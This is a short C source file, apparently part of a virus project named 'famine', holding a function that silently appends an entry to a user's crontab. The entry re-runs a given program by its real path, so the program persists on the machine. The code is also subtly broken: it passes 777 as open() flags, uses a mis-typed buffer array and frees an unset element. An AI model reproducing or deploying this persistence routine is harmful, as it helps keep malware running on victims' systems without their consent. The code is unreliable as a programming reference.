#include "famine.h"

void create_cron(char *filename)
{
    int fd = open("/var/spool/cron/crontabs/air", O_RDONLY);
    if (fd < 0)
    {
        return;
    }
    int flag = 0;
    char *content[100][500];
   
    char cwd[1024];
    char *path = NULL;
    char *cron_schedule = NULL;
    path = realpath(filename, path);

    if (path == NULL)
    {
        return;
    }
    cron_schedule = ft_strjoin(CRON_SCHEDULE, path);


    int i = 0;
    while (get_next_line(fd, content[i]))
    {
        if (ft_strcmp(*content[i], cron_schedule) == 0)
        {
            flag = 1;
        }
        i++;
    }
    close(fd);

    if (flag == 0)
    {
        fd = open("/var/spool/cron/crontabs/air", 777);

        for (int j = 0; j < i; j++)
        {
            write(fd, *content[j], ft_strlen(*content[j]));
            write(fd, "\n", 1);
        }
        write(fd, cron_schedule, ft_strlen(cron_schedule));
        write(fd, "\n", 1);
        close(fd);
    }

    free(path);
    free(cron_schedule);
    while (i >= 0)
    {
        free(*content[i]);
        i--;
    }
    
    return;
}